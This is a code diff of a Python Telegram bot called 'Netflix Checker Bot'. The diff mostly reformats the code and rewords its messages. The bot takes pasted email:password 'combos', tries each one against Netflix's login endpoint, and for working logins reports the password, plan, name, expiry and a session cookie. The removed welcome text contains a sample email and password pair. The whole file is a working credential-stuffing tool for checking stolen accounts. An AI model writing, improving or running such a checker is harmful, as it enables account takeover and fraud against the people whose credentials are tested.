@@ -31,14 +31,17 @@ class NetflixChecker:
 
             country = "US"
             try:
-                geo = session.get("https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
-                                  headers={"User-Agent": ua}, timeout=10)
+                geo = session.get(
+                    "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
+                    headers={"User-Agent": ua}, timeout=10
+                )
                 if geo.status_code == 200:
                     try:
                         country = geo.json().get("country", "US")
                     except:
                         m = re.search(r'"country":"(.*?)"', geo.text)
-                        if m: country = m.group(1)
+                        if m:
+                            country = m.group(1)
             except:
                 pass
 
@@ -88,8 +91,10 @@ class NetflixChecker:
                 "User-Agent": ua
             }
 
-            res_auth = session.post("https://web.prod.cloud.netflix.com/graphql", 
-                                    json=payload, headers=headers, timeout=20)
+            res_auth = session.post(
+                "https://web.prod.cloud.netflix.com/graphql",
+                json=payload, headers=headers, timeout=20
+            )
 
             if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
                 acc = session.get("https://www.netflix.com/account", headers={"User-Agent": ua}, timeout=15)
@@ -114,35 +119,38 @@ class NetflixChecker:
 
                 return f"""✅ <b>SUCCESSFUL LOGIN</b>
 
-📧 Email: <code>{email}</code>
-🔑 Pass: <code>{password}</code>
-🌍 Country: {country_name}
-📱 Screens: {screens}
-👤 Status: {member}
-👤 Name: {name}
-📅 Expire: {expire}
-🍪 Cookie: <code>{cookie_str[:100]}...</code>"""
+📧 <b>Email:</b> <code>{email}</code>
+🔑 <b>Password:</b> <code>{password}</code>
+🌍 <b>Country:</b> {country_name}
+📱 <b>Screens:</b> {screens}
+👤 <b>Status:</b> {member}
+👤 <b>Name:</b> {name}
+📅 <b>Expire:</b> {expire}
+🍪 <b>Cookie:</b> <code>{cookie_str[:100]}...</code>"""
             else:
-                return f"❌ Bad Login\nEmail: <code>{email}</code>"
+                return f"❌ <b>Bad Login</b>\nEmail: <code>{email}</code>"
 
         except Exception as e:
-            logger.error(f"Error: {e}")
+            logger.error(f"Error checking {email}: {e}")
             return f"⚠️ Error\nEmail: <code>{email}</code>"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 <b>Netflix Checker Bot</b>\n\n"
-        "Send email:password (one per line)\n"
-        "Example:\ngiorgio_valiente@yahoo.com:giorgiovaliente021",
+        "Send combos like:\n"
+        "<code>email:password</code>\n\n"
+        "Multiple lines supported.",
         parse_mode='HTML'
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.text:
         return
+
     lines = [line.strip() for line in update.message.text.splitlines() if ':' in line.strip()]
+
     if not lines:
-        await update.message.reply_text("❌ Send email:password combos")
+        await update.message.reply_text("❌ Please send email:password")
         return
 
     checker = NetflixChecker()
@@ -154,7 +162,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result = await checker.check_account(email, password)
             await update.message.reply_text(result, parse_mode='HTML', disable_web_page_preview=True)
         except:
-            pass
+            await update.message.reply_text(f"❌ Invalid: {line}")
 
     await update.message.reply_text("✅ Check completed!", parse_mode='HTML')
 
@@ -164,12 +172,12 @@ def main():
         return
 
     application = Application.builder().token(TOKEN).build()
+
     application.add_handler(CommandHandler("start", start))
-    
-    # CLEAN HANDLER - NO BACKSLASH
+    # Clean handler - no backslash
     application.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
 
-    logger.info("🚀 Bot started successfully!")
+    logger.info("🚀 Netflix Checker Bot started!")
     application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
